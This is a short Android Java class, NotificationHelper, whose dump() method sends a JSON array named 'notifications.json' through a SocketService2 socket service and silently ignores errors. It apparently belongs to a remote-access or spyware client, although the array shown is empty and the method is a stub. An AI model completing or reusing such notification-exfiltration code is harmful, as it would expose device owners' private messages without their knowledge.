package com.rainbow.client;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;

public class NotificationHelper {
    public static void dump(Context ctx) {
        try {
            JSONArray arr = new JSONArray();
            SocketService2.sendFile("notifications.json", arr.toString().getBytes());
        } catch (Exception ignored) {}
    }
}